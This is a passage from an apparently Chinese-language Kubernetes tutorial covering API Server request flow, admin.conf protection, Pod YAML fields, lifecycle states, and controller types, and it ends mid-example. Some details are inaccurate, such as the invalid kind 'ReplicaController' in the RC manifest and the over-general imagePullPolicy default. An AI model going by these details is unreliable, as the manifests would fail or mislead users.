变更&#x3D;&#x3D;：<ol><li>作为集群 Leader 的 Master 节点上，Scheduler、Controller Manager 等组件监听 etcd 的数据变更，并执行相应操作</li><li>Master 和 Worker 节点上的 Kubelet 也会监听 etcd 变更，在需要操作容器时，调用 <code>containerd</code> 以执行相应的任务<pre class="mermaid">graph TD A["Master 终端 / 管理机终端 上执行 kubectl 命令"] --> |"携带 Master 机的 ~/.kube/admin.conf，并根据其配置的 API Server 地址(VIP)"| B["VIP(192.168.136.100)"] B -->|"VIP 在 Haproxy 上漂移"| C["Haproxy 集群"] C --> C1["Haproxy1(192.168.136.14)"] C --> C2["Haproxy2(192.168.136.15)"] C1 -->|"进行负载均衡"| D1["Master1(192.168.136.8)"] C1 -->|"进行负载均衡"| D2["Master2(192.168.136.9)"] C2 -->|"进行负载均衡"| D1 C2 -->|"进行负载均衡"| D2 D1 -->|"访问 6443 端口"| E1["Master1 上的 API Server"] D2 -->|"访问 6443 端口"| E2["Master2 上的 API Server"] E1 -->|"API Server 验证 config 文件，完成认证与鉴权"| F["API Server 与 etcd 交互"] E2 -->|"API Server 验证 config 文件，完成认证与鉴权"| F["API Server 与 etcd 交互"] F --> |"组件响应 etcd 变更"| G["组件响应 etcd 变更（Scheduler、Controller Manager、Kubelet）"]</pre></li></ol></li></ol><hr><h5 id="4-2-3-管理员执行命令（Pod-内部）"><a href="#4-2-3-管理员执行命令（Pod-内部）" class="headerlink" title="4.2.3. 管理员执行命令（Pod 内部）"></a>4.2.3. 管理员执行命令（Pod 内部）</h5><ol><li>&#x3D;&#x3D;管理员执行命令&#x3D;&#x3D;：<ol><li>管理员在 Pod 内部执行 <code>kubectl</code> 命令，默认通过 <code>https://kubernetes.default.svc:443</code> <strong>负载均衡</strong>到集群中的某个 Master 节点的 API Server（这是一个 K8S 内部 DNS URL，由 K8S DNS 解析）</li><li>必须 <strong>手动</strong> 携带 Pod 挂载的 <code>Service Account</code> 的 <code>Token</code> 令牌（☆☆☆）。</li></ol></li><li>&#x3D;&#x3D;命令到达 Master 节点&#x3D;&#x3D;：<ol><li>通过 Kubernetes DNS 解析 <code>kubernetes.default.svc</code>，请求被路由至某个 Master 节点，并访问其 <code>6443</code> 端口</li></ol></li><li>&#x3D;&#x3D;命令到达 API Server&#x3D;&#x3D;：<ol><li>目标 Master 节点上的 API Server 接收请求，并通过 <code>6443</code> 端口进行处理。</li><li>API Server 验证 <code>Service Account</code> 的有效性，并检查其权限，完成认证与鉴权</li></ol></li><li>&#x3D;&#x3D;API Server 与 etcd 交互&#x3D;&#x3D;：<ol><li>API Server 通过 etcd 客户端库，将请求操作（如资源创建、更新）写入 etcd 分布式数据库集群。</li></ol></li><li>&#x3D;&#x3D;组件响应 etcd 变更&#x3D;&#x3D;<ol><li>作为集群 Leader 的 Master 节点上，Scheduler、Controller Manager 等组件监听 etcd 的数据变更，并执行相应操作</li><li>Master 和 Worker 节点上的 Kubelet 也会监听 etcd 变更，在需要操作容器时，调用 <code>containerd</code> 以执行相应的任务</li></ol></li><li>&#x3D;&#x3D;注意事项&#x3D;&#x3D;：<ol><li>该操作与管理员的个人身份<strong>无关</strong>，权限完全取决于 Pod 绑定的 <code>Service Account</code>。<pre class="mermaid">graph TD  A["Pod 内部执行 kubectl 命令"] -->|"需携带该 Pod 的 Service Account Token"| B["访问 https:// kubernetes.default.svc:6443"] B -->|"负载均衡"| D1["Master1(192.168.136.8)"] B -->|"负载均衡"| D2["Master2(192.168.136.9)"] D1 -->|"访问 6443 端口"| E1["Master1 上的 API Server"] D2 -->|"访问 6443 端口"| E2["Master1 上的 API Server"] E1 -->|"API Server 验证 Service Account，完整认证与鉴权"| G["API Server 与 etcd 交互"] E2 -->|"API Server 验证 Service Account，完整认证与鉴权"| G["API Server 与 etcd 交互"] G --> |"组件响应 etcd 变更"| H["组件响应 etcd 变更（Scheduler、Controller Manager、Kubelet）"]</pre></li></ol></li></ol><hr><h4 id="4-3-节点规划"><a href="#4-3-节点规划" class="headerlink" title="4.3. 节点规划"></a>4.3. 节点规划</h4><ol><li>Master 节点的数量应为奇数（如 1、3、5、7 等），这是为了避免在选举过程中出现投票平局的情况，确保集群能够正常选举出 Leader。</li><li>在生产环境中，建议至少部署 3 个 Master 节点，这是最常见的高可用部署方式，可以提高集群的稳定性和容错能力。</li><li>根据不同的工作负载，可以对 Worker 节点进行合理划分，结合亲和性、反亲和性、污点和容忍性等策略，让调度器（Scheduler）将 Pod 调度到适合的节点。例如，计算密集型应用可以分配到高 CPU 性能的节点，而内存密集型应用可以分配到内存更大的节点，从而实现资源的最优利用。</li></ol><hr><h4 id="4-4-安全规划"><a href="#4-4-安全规划" class="headerlink" title="4.4. 安全规划"></a>4.4. 安全规划</h4><ol><li><code>kubeadm</code> 在 <code>/etc/kubernetes/</code> 目录下自动生成的 <code>admin.conf</code> 文件包含了对 Kubernetes 集群的最高权限，因此必须由集群管理员严格保管，不要长期保留在 <code>Master</code> 节点中。</li><li><code>Master</code> 节点上的 <code>~/.kube/admin.conf</code> 应该仅允许授权的管理员访问，其他人严格限制访问</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>kubeadm</code> 自动在 <code>/etc/kubernetes/</code> 下生成的 <code>admin.conf</code>，更像是一个模板，供管理员配置使用。</li><li>而 <code>kubectl</code> 的执行，实际使用的是 <code>~/.kube/</code> 下的 <code>admin.conf</code></li></ol></blockquote><hr><h3 id="5-K8S-核心概念：Pod"><a href="#5-K8S-核心概念：Pod" class="headerlink" title="5. K8S 核心概念：Pod"></a>5. K8S 核心概念：Pod</h3><h4 id="5-1-Pod-概述"><a href="#5-1-Pod-概述" class="headerlink" title="5.1. Pod 概述"></a>5.1. Pod 概述</h4><p>在 Kubernetes（K8S）体系中，它并非直接对容器进行操作，而是以操作 Pod 为主要形式。Pod 作为 K8S 最小的操作单元，犹如一个功能完备的 “封装舱”，将一个或多个容器封装其中，同时为这些容器提供共享的存储资源、统一的网络环境以及一致的配置信息。可以说，Pod 是 Kubernetes 运行应用程序的基础载体，应用依托 Pod 得以在 K8S 集群中稳定运行和调度。</p><hr><h4 id="5-2-Pod-的生命周期"><a href="#5-2-Pod-的生命周期" class="headerlink" title="5.2. Pod 的生命周期"></a>5.2. Pod 的生命周期</h4><table><thead><tr><th>状态值</th><th align="left">说明</th></tr></thead><tbody><tr><td><strong>Pending</strong></td><td align="left">Pod 已创建，但 Pod 中的一个或多个容器的镜像还没有创建</td></tr><tr><td><strong>Running</strong></td><td align="left">Pod 内所有容器已创建，且至少一个容器处于运行状态</td></tr><tr><td><strong>Succeed</strong></td><td align="left">Pod 内所有容器均成功执行退出，且不会再重启</td></tr><tr><td><strong>Failed</strong></td><td align="left">Pod 内所有容器均已退出，但至少一个容器退出失败</td></tr><tr><td><strong>Unknown</strong></td><td align="left">由于某种原因无法获取 Pod 状态，例如网络通信不畅</td></tr></tbody></table><hr><h4 id="5-3-Pod-资源的写法"><a href="#5-3-Pod-资源的写法" class="headerlink" title="5.3. Pod 资源的写法"></a>5.3. Pod 资源的写法</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><br><span class="hljs-params">kind:</span> Pod<br><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> string<br>  <span class="hljs-params">namespace:</span> string<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">name:</span> string<br>  <span class="hljs-params">annotations:</span><br>    <span class="hljs-params">name:</span> string<br><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> string<br>      <span class="hljs-params">image:</span> string<br>      <span class="hljs-params">imagePullPolicy:</span> Always | Never | IfNotPresent  <br>   <span class="hljs-params">workingDir:</span> string<br>      <span class="hljs-params">command:</span> [<span class="hljs-string">&quot;string&quot;</span>]<br>      <span class="hljs-params">args:</span> [<span class="hljs-string">&quot;string&quot;</span>]<br><br><br>      <span class="hljs-params">volumeMounts:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> string<br>          <span class="hljs-params">mountPath:</span> string<br>          <span class="hljs-params">subPath:</span> string<br>          <span class="hljs-params">readOnly:</span> boolean<br><br>      <span class="hljs-params">ports:</span><br>          <span class="hljs-params">containerPort:</span> int<br>          <span class="hljs-params">hostPort:</span> int<br>          <span class="hljs-params">protocol:</span> TCP | UDP<br>          <br>  <span class="hljs-params">envFrom:</span><br>  configMapRef | secretRef<br>  <br>      <span class="hljs-params">env:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> string<br>          <span class="hljs-params">value:</span> string<br>          <span class="hljs-params">valueFrom:</span><br>            configMapRef | secretKeyRef | fieldRef | resourceFieldRef<br><br>      <span class="hljs-params">resources:</span><br>        <span class="hljs-params">limits:</span><br>          <span class="hljs-params">cpu:</span> string<br>          <span class="hljs-params">memory:</span> string<br>        <span class="hljs-params">requests:</span><br>          <span class="hljs-params">cpu:</span> string<br>          <span class="hljs-params">memory:</span> string<br><br>      <span class="hljs-params">livenessProbe:</span><br>    httpGet | tcpSocket | exec<br>    <br>  <span class="hljs-params">readinessProbe:</span><br>    httpGet | tcpSocket | exec<br>        <br><br>  <span class="hljs-params">restartPolicy:</span> Always | Never | OnFailure<br><br>  <span class="hljs-params">imagePullSecrets:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> string<br><br>  <span class="hljs-params">hostNetwork:</span> <span class="hljs-literal">false</span><br><br>  <span class="hljs-params">volumes:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> string<br>      emptyDir | hostPath | nfs | persistentVolumeClaim | configMap | ......<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;apiVersiion&#x3D;&#x3D;：<ol><li>指定 API 版本，告诉 Kubernetes <strong>如何解析</strong> 这个 YAML 文件</li><li>可以使用 <code>kubectl api-versions</code> 查询支持的 API 版本。</li></ol></li><li>&#x3D;&#x3D;kind&#x3D;&#x3D;：<ol><li>定义 <strong>资源类型</strong>，即这个 YAML 文件要创建的 Kubernetes 资源，如 <code>Pod</code>、<code>Service</code>、<code>Deployment</code> 等。</li></ol></li><li>&#x3D;&#x3D;metadata&#x3D;&#x3D;：<ol><li><font color="#00b0f0">name</font>：<ol><li>资源的唯一名称，在同一命名空间下不能重复。</li></ol></li><li><font color="#00b0f0">namespace</font>：<ol start="2"><li>资源所属的命名空间，未指定时默认使用当前 <code>kubectl</code> 上下文的命名空间。</li><li>若未切换到其他 <code>kubectl</code> 上下文，则使用默认上下文，其命名空间为 <code>default</code>。</li></ol></li><li><font color="#00b0f0">labels</font>：<ol><li>资源的标签，用于分类和筛选资源，可通过 <code>selector</code> 进行匹配。</li><li>详细见下文：K8S 核心概念：Labels</li></ol></li><li><font color="#00b0f0">annotations</font>：<ol><li>不要误将其理解为“注解”。虽然名字上像是注解，但 <code>annotations</code> 是用来存储<strong>额外元数据</strong>的字段，这些数据不会影响资源的实际运行或行为，但可以被外部工具、系统或用户读取和使用。</li></ol></li></ol></li><li>&#x3D;&#x3D;spec&#x3D;&#x3D;：<ol><li><font color="#00b0f0">containers</font>：<ol><li>定义该 Pod 内部运行的所有容器</li><li><font color="#7030a0">name</font>：<ol><li>容器的名称，同一个 Pod 下必须唯一</li></ol></li><li><font color="#7030a0">image</font>：<ol><li>容器的镜像，通常是 Docker Hub 或私有镜像仓库中的镜像</li></ol></li><li><font color="#7030a0">imagePullPolicy</font>：<ol start="2"><li>定义 Pod 拉取镜像的策略</li><li><font color="#00b050">Always（默认）</font>：<ol><li>每次创建 Pod 都强制拉取镜像</li></ol></li><li><font color="#00b050">IfNotPresent</font>：<ol start="2"><li>如果本地已有镜像，不会重新拉取</li></ol></li><li><font color="#00b050">Never</font>：<ol start="3"><li>绝对不拉取进行，只使用本地的已有镜像</li></ol></li></ol></li><li><font color="#7030a0">workingDir</font>:<ol><li>容器内的工作目录，相当于 cd 进入某个目录再运行 <code>command</code>，如果不指定，则使用默认的 <code>/</code> 根目录</li></ol></li><li><font color="#7030a0">command</font>:<ol start="2"><li>用于覆盖镜像内部默认的启动命令（<code>Entrypoint</code>），如果不指定，容器会使用镜像内部的默认命令</li><li>通常，<code>command</code> 与 <code>args</code> 结合使用，<code>command</code> 作为可执行文件，<code>args</code> 作为传递给 <code>command</code> 的参数：<ol><li>例如：<code>command: [&quot;/bin/sh&quot;,&quot;-c&quot;],args: [&quot;echo Hello &amp;&amp; sleep 3600&quot;]</code> ，最终效果是：<code>/bin/sh -c &quot;echo Hello &amp;&amp; sleep 3600&quot;</code></li></ol></li><li>如果你想查看容器的默认启动命令，你可以借助 Docker：<code>docker inspect &lt;image-name / image-id&gt;</code>，返回的 JSON 结果中，你可以找到 <code>Cmd</code> 和 <code>Entrypoint</code><ol start="2"><li>如果 <code>Entrypoint</code> 是 <code>null</code> ，则使用 <code>Cmd</code> 作为默认命令</li><li>如果 <code>Entrypoint</code> 存在，则 <code>Cmd</code> 作为其参数</li></ol></li></ol></li><li><font color="#7030a0">args</font>：<ol><li>用于覆盖镜像内部默认的启动命令的参数（<code>Cmd</code>），如果不指定，容器会使用镜像内部的默认参数</li></ol></li><li><font color="#7030a0">volumeMounts</font>：<ol><li>容器内卷的挂载配置，用于将 <code>volumes</code> 中定义的存储卷挂载到容器内的指定目录。</li><li><font color="#00b050">name</font>：<ol><li>指定要挂载的存储卷的名称，必须与 <code>volumes</code> 中定义的名称匹配。</li></ol></li><li><font color="#00b050">mountPath</font>：<ol start="2"><li>挂载点，即存储卷挂载到容器内的哪个目录。</li></ol></li><li><font color="#00b050">subPath</font>：<ol start="3"><li>只挂载卷内的某个子路径或特定文件，而不是整个卷</li></ol></li><li><font color="#00b050">readOnly</font>：<ol start="4"><li>是否以只读的方式挂载。<code>true</code> 表示卷只能读取，不能写入；<code>false</code> 表示可读写（默认值）。</li></ol></li><li>注意：如果容器中的挂载点已经有文件，挂载存储卷后，原有文件会被暂时替代</li><li>详细见下文：K8S 核心概念：K8S存储 &#x2F; 补充：Volume 挂载方法</li></ol></li><li><font color="#7030a0">ports</font>：<ol><li><font color="#00b050">containerPort</font>：<ol><li>容器内应用监听的端口</li></ol></li><li><font color="#00b050">hostPort</font>：<ol start="2"><li>容器所在宿主机端口与容器监听的端口映射</li></ol></li><li><font color="#00b050">protocol</font>：<ol><li>指定端口的协议类型，通常是 <code>TCP</code> 或 <code>UDP</code>。</li><li><font color="#e36c09">TCP（默认）</font>：<ol><li>一般我们都用这个，是传输控制协议，面向连接，可靠的通信。</li></ol></li><li><font color="#e36c09">UDP</font> ：<ol><li>用户数据报协议，无连接，适用于不需要可靠性保障的应用（例如视频流、游戏等）。</li></ol></li></ol></li><li>注意：推荐在 Service 中统一管理，而不是在 Pod 中直接使用</li></ol></li><li><font color="#7030a0">envFrom</font>:<ol><li>从外部源（如 ConfigMap、Secret）加载多个环境变量</li><li><font color="#00b050">configMapRef</font>：<ol><li>引用一个 configMap，将其中的所有键值对加载为环境变量</li></ol></li><li><font color="#00b050">secretRef</font>：<ol><li>引用一个 secret，将其中的所有键值对加载为环境变量</li></ol></li><li>详细见下文：K8S 核心概念：K8S存储 &#x2F; 补充：Env 挂载方法和相关命令</li></ol></li><li><font color="#7030a0">env</font>:<ol><li>手动 <strong>指定 &#x2F; 覆盖 &#x2F; 获取</strong> 环境变量，在容器内的应用程序可以通过 <code>$&#123;env-name&#125;</code> 进行输出</li><li><font color="#00b050">name</font>：<ol><li>指定环境变量的名称</li></ol></li><li><font color="#00b050">value</font>：<ol><li>手动 <strong>指定 &#x2F; 覆盖</strong> 环境变量的值</li><li>若变量不存在，则设置为指定值；若变量已存在，则覆盖原有值</li></ol></li><li><font color="#00b050">valueFrom</font>:<ol start="2"><li>从外部源 <strong>获取</strong> 环境变量的值</li><li><font color="#e36c09">configMapRef</font>:<ol><li>从 configMap 中 获取 某个键的值</li></ol></li><li><font color="#e36c09">secretKeyRef</font>：<ol start="2"><li>从 secret 中 获取 某个键的值</li></ol></li><li><font color="#e36c09">fieldRef</font>：<ol start="3"><li>从当前 Pod 的 <code>metadata</code> 中 获取 值</li></ol></li><li><font color="#e36c09">resourceFieldRef</font>：<ol start="4"><li>从当前 Pod 的<code>resources</code> 下的 <code>limits</code> 或 <code>requests</code> 中 获取 值</li></ol></li></ol></li><li>详细见下文：K8S 核心概念：K8S存储 &#x2F; 补充：Env 挂载方法和相关命令</li></ol></li><li><font color="#7030a0">resources</font>:<ol><li>容器的资源请求和限制</li><li><font color="#00b050">request</font>：<ol><li><font color="#e36c09">cpu</font>：<ol><li>容器请求的 CPU 数量，如 “500m” 是 0.5 核</li></ol></li><li><font color="#e36c09">memory</font>：<ol start="2"><li>容器请求的 内存 大小，如 “512Mi”、”2Gi”</li></ol></li></ol></li><li><font color="#00b050">limits</font><ol><li><font color="#e36c09">cpu</font>:<ol><li>限制容器的 CPU 数量</li></ol></li><li><font color="#e36c09">memory</font>：<ol start="2"><li>限制容器的 内存 大小</li></ol></li></ol></li><li>详细见下文：K8S 核心概念：Controller &#x2F; Deployment 实战步骤</li></ol></li><li><font color="#7030a0">livenessProbe</font>：<ol><li>存活探针，判断容器是否存活</li><li><font color="#00b050">tcpSocket</font>：<ol><li>使用 tcp socket 探针</li></ol></li><li><font color="#00b050">httpGet</font>：<ol><li>使用 http get 探针</li></ol></li><li><font color="#00b050">exec</font>：<ol start="2"><li>使用命令行探针</li></ol></li><li>详细见下文：K8S 核心概念：K8S 探针 &#x2F; 存活探针实战步骤</li></ol></li><li><font color="#7030a0">readinessProbe</font>：<ol><li>就绪探针，判断容器是否准备好接受流量</li><li><font color="#00b050">tcpSocket</font>：<ol><li>使用 tcp socket 探针</li></ol></li><li><font color="#00b050">httpGet</font>：<ol start="2"><li>使用 http get 探针</li></ol></li><li><font color="#00b050">exec</font>：<ol><li>使用命令行探针</li></ol></li><li>详细见下文：K8S 核心概念：K8S 探针 &#x2F; 就绪探针实战步骤</li></ol></li></ol></li><li><font color="#00b0f0">restartPolicy</font>：<ol><li>Pod 的重启策略</li><li><font color="#7030a0">Always（默认）</font>：<ol><li>当容器失效时（无论正常退出还是异常退出），由 kubelet 自动重启该容器</li></ol></li><li><font color="#7030a0">OnFailure</font>：<ol start="2"><li>当容器终止运行且推出码不为 0 时（异常退出），由 kubelet 自动重启该容器</li></ol></li><li><font color="#7030a0">Never</font>：<ol start="3"><li>不论容器运行状态如何，kubelete 都不会重启该容器</li></ol></li></ol></li><li><font color="#00b0f0">imagePullSecrets</font>：<ol><li>指定拉取私有镜像的秘钥，通常是指向 dockerconfigjson Secret</li><li>详细见下文：K8S 核心概念：K8S 存储 &#x2F; Secret 实战步骤 &#x2F; dockerconfigjson Secret 实战步骤</li><li>注意：假如你指定了阿里云的私钥，但尝试从 Docker Hub 拉取镜像，这不会产生任何影响，因为 <code>imagePullSecrets</code> 只会用于认证指定的镜像仓库。</li></ol></li><li><font color="#00b0f0">hostNetwork</font>：<ol><li>决定 Pod 是使用 Kubernetes 默认的网络隔离模式，还是直接复用主机的网络。虽然使用主机网络（<code>hostNetwork: true</code>）可以减少网络转发的开销，从而提升访问速度，但通常我们会保持默认设置（<code>false</code>），以保证良好的网络隔离性和应用的可移植性。</li><li><font color="#7030a0">true</font>：<ol><li>容器将直接使用主机的网络资源，包括主机的 IP 和端口。</li><li>这种方式能提升网络性能，适用于高并发的场景（比如数据库），但通常我们会避免使用，特别是在像 Spring Boot 或 Spring Cloud 这样的应用中。默认情况下我们更倾向于保持网络隔离性和可移植性。</li></ol></li><li><font color="#7030a0">false（默认）</font>：<ol><li>使用 Kubernetes 提供的默认网络隔离，容器有独立的网络环境，无法直接访问主机的网络。</li><li>大多数情况下，我们会选择这个选项，以确保容器和主机网络的隔离。</li></ol></li></ol></li><li><font color="#00b0f0">volumes</font>：<ol><li>定义 Pod 级别的存储卷</li><li><font color="#7030a0">name</font>：<ol><li>存储卷名称</li></ol></li><li><font color="#7030a0">emptyDir</font>：<ol><li>使用 <code>emptyDir</code> 存储方式</li></ol></li><li><font color="#7030a0">hostPath</font>：<ol start="2"><li>使用 <code>hostPath</code> 存储方式</li></ol></li><li><font color="#7030a0">nfs</font>：<ol><li>使用 <code>nfs</code> 存储方式</li></ol></li><li><font color="#7030a0">persistentVolumeClaim</font>：<ol start="2"><li>使用 <code>pv + pvc</code> 存储方式</li></ol></li><li><font color="#7030a0">configMap</font>：<ol><li>使用 <code>configMap</code> 存储方式</li></ol></li><li><font color="#7030a0">其他存储方式</font>：<ol start="2"><li>除了上述的存储方式，还有其他很多的存储方式</li></ol></li><li>详细见下文：K8S 核心概念：K8S 存储 &#x2F; 补充：Volume 挂载方法</li></ol></li></ol></li></ol><hr><h3 id="6-K8S-核心概念：Controller"><a href="#6-K8S-核心概念：Controller" class="headerlink" title="6. K8S 核心概念：Controller"></a>6. K8S 核心概念：Controller</h3><h4 id="6-1-Controller-引入的原因"><a href="#6-1-Controller-引入的原因" class="headerlink" title="6.1. Controller 引入的原因"></a>6.1. Controller 引入的原因</h4><p>在 前面的 Pod 中，我们虽然可以成功启动 Pod，但整个过程依赖手动管理。如果某个 Pod 发生故障，我们需要手动检测并重启，不仅繁琐，还影响效率。</p><p>而 Controller 的作用正是自动管理 Pod。它会监听 <code>etcd</code> 的变更，并通过 Scheduler 和 Kubelet 来管理 Pod 的生命周期，确保集群中的 Pod 数量符合预期：</p><ol><li>当 Pod 发生故障时，根据其 <code>restartPolicy</code> 自动重启（是否重启取决于策略设定）。</li><li>当节点发生故障时，触发 Pod 迁移，确保应用的高可用性。</li></ol><hr><h4 id="6-2-Controller-的类型"><a href="#6-2-Controller-的类型" class="headerlink" title="6.2. Controller 的类型"></a>6.2. Controller 的类型</h4><p>Controller 主要分为以下几类：</p><ol><li>&#x3D;&#x3D;ReplicationController（过时）&#x3D;&#x3D;：<ol><li><code>ReplicationController</code> 可确保指定数量的 Pod <strong>始终保持运行</strong>，即使某些 Pod 发生故障，也会自动补充。同时，它<strong>支持手动调整 Pod 副本数量</strong>，方便进行扩容或缩容</li><li>然而，该过滤器已过时，不建议在新项目中使用。原因在于它仅支持基于 等值匹配（equality-based） 的标签选择器（如 <code>app=my-nginx</code>），而无法兼容集合匹配（set-based） 选择器（如 <code>app in (nginx, web)</code>）</li></ol></li><li>&#x3D;&#x3D;ReplicaSet&#x3D;&#x3D;：<ol><li><code>ReplicaSet</code> 是 <code>ReplicationController</code> 的<strong>升级版</strong>，提供了更强的标签匹配功能（如支持基于集合的 Label Selector），比 RC 更灵活</li><li><code>ReplicaSet</code> 很少单独使用，通常是作为 <code>Deployment</code> 的一部分，由 <code>Deployment</code> 来管理</li></ol></li><li>&#x3D;&#x3D;Deployment&#x3D;&#x3D;：<ol><li><code>Deployment</code> 通过管理 <code>ReplicaSet</code>，负责 Pod 的创建、删除和更新。当你创建一个 <code>Deployment</code> 时，实际上他会自动创建并管理一个 <code>ReplicaSet</code> ，<code>Deployment</code> 通过控制 <code>ReplicaSet</code> 来间接管理 Pod 的创建、删除和更新等操作。</li><li>此外，<code>Deployment</code> 还支持<strong>滚动更新</strong>（平稳升级，避免服务中断）、回滚、暂停&#x2F;恢复更新等功能，并能与 HPA 和 Service 配合使用，实现弹性扩缩容和流量管理</li></ol></li><li>&#x3D;&#x3D;HPA&#x3D;&#x3D;：<ol><li><code>Horizontal Pod Autoscaler（HPA）</code>用于根据 CPU 使用率、内存使用率或自定义指标自动调整 Deployment 等资源的 Pod 副本数量，以实现资源的<strong>弹性伸缩</strong>。</li><li>举例来说，若让 HPA 监控 CPU 使用率，当 CPU 使用率超出设定的阈值（如 50%）时，HPA 会自动增加 Pod 的数量，以应对更高的负载；而当 CPU 使用率低于设定阈值时，HPA 则会减少 Pod 的数量，从而节省资源。</li></ol></li><li>&#x3D;&#x3D;Deployment + HPA&#x3D;&#x3D;：<ol><li>当前主流，强烈推荐，其口诀是，先创 Deployment 再创 HPA</li></ol></li></ol><hr><h4 id="6-3-RC-实战步骤"><a href="#6-3-RC-实战步骤" class="headerlink" title="6.3. RC 实战步骤"></a>6.3. RC 实战步骤</h4><p>&#x3D;&#x3D;1.编写 RC 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> ReplicaController<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> nginx-rc<br>  <span class="hljs-params">namespace:</span> default<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">controller:</span> nginx-rc<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span>                                        <span class="hljs-comment"># 期望始终有几个 Pod</span><br>  <span class="hljs-params">selector:</span>                                          <span class="hljs-comment"># 指定该控制器负责哪些标签的 Pod</span><br>    <span class="hljs-params">app:</span> nginx<br>  <span class="hljs-params">template:</span>                                          <span class="hljs-comment"># Pod 模版，用来定义 Pod</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> nginx<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">containers:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nginx-container<br>          <span class="hljs-params">image:</span> nginx:<span class="hljs-number">1.23</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ReplicationController</code> 允许在 <code>spec.template</code> 中定义 <code>Pod</code> 资源，除了 <code>apiVersion</code>、<code>kind</code>、<code>metadata.namespace</code>，其他字段均可在 <code>spec.template</code> 中指定</li><li>Pod 模版中不能单独指定 <code>kind</code>，因为他的类型只能是 Pod</li><li><font color="#ff0000">Pod 模版中不能单独指定 <code>namespace</code>，它会自动继承其所属 <code>Controller</code> 的 <code>namespace</code>。（☆☆☆）</font></li><li>Pod 的 <code>labels</code> 与 Controller 的 <code>labels</code> 互不相关：<code>Pod</code> 的 <code>labels</code> 仅用于标识 Pod 本身，而 <code>Controller</code> 的 <code>labels</code> 仅用于标识 Controller 本身，二者不会相互继承。</li></ol></blockquote><p>&#x3D;&#x3D;2.创建 RC 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f rc.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 RC 资源状态&#x3D;&#x3D;</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">get</span> rc -n &lt;rc-<span class="hljs-keyword">namespace</span>&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="6-4-RS-实战步骤"><a href="#6-4-RS-实战步骤" class="headerlink" title="6.4. RS 实战步骤"></a>6.4. RS 实战步骤</h4><p>&#x3D;&#x3D;1.编辑 RS 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ReplicaSet<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> 